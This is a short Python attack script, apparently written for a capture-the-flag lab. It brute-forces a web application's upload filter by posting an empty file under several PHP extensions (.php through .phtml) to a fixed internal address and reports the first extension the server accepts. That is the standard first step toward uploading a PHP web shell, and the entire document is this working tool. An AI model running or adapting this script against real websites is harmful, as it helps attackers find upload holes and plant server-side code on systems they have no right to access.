import requests
import os
import sys
extensions_list = [
    ".php",
    ".php3",
    ".php4",
    ".php5",
    ".phtml",
    ]
empty_test_file=open("testfile","w")
root_name="testfile"
dynamic_name="testfile"

ip='10.10.85.238'
url=f"http://{ip}:3333/internal/index.php"
for extension in extensions_list:
    os.rename(dynamic_name,root_name+extension)
    dynamic_name=root_name+extension
    
    upload_files={"file": open(dynamic_name,"rb")}
    print(f"Trying to upload {dynamic_name} to {url}")
    r=requests.post(url ,files=upload_files)
    
    if "Extension not allowed" not in r.text:
        print(f"    ->>{extension} extension have been allowed by the website, exiting !!! ")
        sys.exit(0)
    else:
        print(f"    ->>{extension} is not allowed.")
        
